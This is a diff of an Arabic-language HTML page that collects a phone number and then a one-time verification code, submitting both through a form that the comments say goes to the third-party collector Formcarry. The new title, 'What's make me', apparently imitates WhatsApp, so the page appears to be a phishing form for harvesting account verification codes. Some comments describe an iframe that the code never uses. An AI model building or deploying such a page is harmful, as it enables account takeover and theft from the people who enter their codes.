@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>نموذج رقم الهاتف والكود</title>
+  <title>What's  make me</title>
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -82,17 +82,6 @@
     #codeField {
       display: none;
     }
-    #messageBox {
-      margin-top: 10px;
-      text-align: center;
-      font-weight: 600;
-      min-height: 22px;
-      color: #d9534f; /* أحمر للأخطاء، يتغير حسب الحالة */
-      transition: opacity 0.3s ease;
-    }
-    #messageBox.success {
-      color: #28a745;
-    }
   </style>
 </head>
 <body>
@@ -112,7 +101,6 @@
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
         <button type="submit" id="sendCodeBtn">إرسال الكود</button>
       </div>
-      <div id="messageBox"></div>
     </form>
   </div>
 
@@ -120,37 +108,25 @@
 
   <script>
     let countdownInterval;
-    const messageBox = document.getElementById('messageBox');
-
-    function showMessage(msg, type = 'error') {
-      messageBox.textContent = msg;
-      if(type === 'success'){
-        messageBox.classList.add('success');
-      } else {
-        messageBox.classList.remove('success');
-      }
-      messageBox.style.opacity = '1';
-      setTimeout(() => {
-        messageBox.style.opacity = '0';
-      }, 3000);
-    }
 
     function sendPhone() {
       const phoneInput = document.getElementById('phone');
       const sendPhoneBtn = document.getElementById('sendPhoneBtn');
       const timerDisplay = document.getElementById('timer');
       const codeField = document.getElementById('codeField');
+      const codeInput = document.getElementById('code');
 
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
-        showMessage('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً', 'error');
+        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
         phoneInput.focus();
         return;
       }
 
-      // إزالة رسالة سابقة
-      messageBox.style.opacity = '0';
+      // أرسل رقم الهاتف بشكل مؤقت للنموذج (نستخدم Formcarry فقط للإرسال النهائي لكن هنا نرسل رقم الهاتف عبر طلب POST غير مباشر)
+      // لكن لأجل تبسيط الإرسال نرسل النموذج كاملاً مع رقم الهاتف فقط
+      // لذا نستخدم iframe ونملأ الكود فارغاً في الإرسال الأول
 
-      // تجهيز حقل الكود المخفي للإرسال مع الرقم فارغ (لإرسال رقم الهاتف فقط)
+      // إنشاء حقل الكود مخفي في الفورم (إذا لم يكن موجود)
       let codeFieldHidden = document.querySelector('input[name="code"]');
       if (!codeFieldHidden) {
         codeFieldHidden = document.createElement('input');
@@ -160,9 +136,13 @@
       }
       codeFieldHidden.value = '';
 
+      // إرسال الفورم
       document.getElementById('mainForm').submit();
 
+      // إظهار خانة الكود
       codeField.style.display = 'block';
+
+      // تعطيل زر إرسال رقم الهاتف + بدء المؤقت
       sendPhoneBtn.disabled = true;
 
       let timeLeft = 480; // 8 دقائق
@@ -178,4 +158,34 @@
         if (timeLeft <= 0) {
           clearInterval(countdownInterval);
           timerDisplay.textContent = '';
-          sendPhoneBtn.disabled
+          sendPhoneBtn.disabled = false;
+        }
+      }, 1000);
+
+      alert('تم إرسال رقم الهاتف، يمكنك الآن إدخال الكود في أي وقت.');
+    }
+
+    function handleSubmit(event) {
+      event.preventDefault();
+
+      const codeInput = document.getElementById('code');
+      const phoneInput = document.getElementById('phone');
+
+      if (codeInput.value.trim() === '') {
+        alert('يرجى كتابة الكود المرسل إليك.');
+        codeInput.focus();
+        return false;
+      }
+
+      // إرسال البيانات مع رقم الهاتف والكود
+      // نرسل الفورم عبر iframe لمنع إعادة تحميل الصفحة
+      document.getElementById('mainForm').submit();
+
+      alert('تم إرسال الكود ورقم الهاتف.');
+
+      return false;
+    }
+  </script>
+
+</body>
+</html>
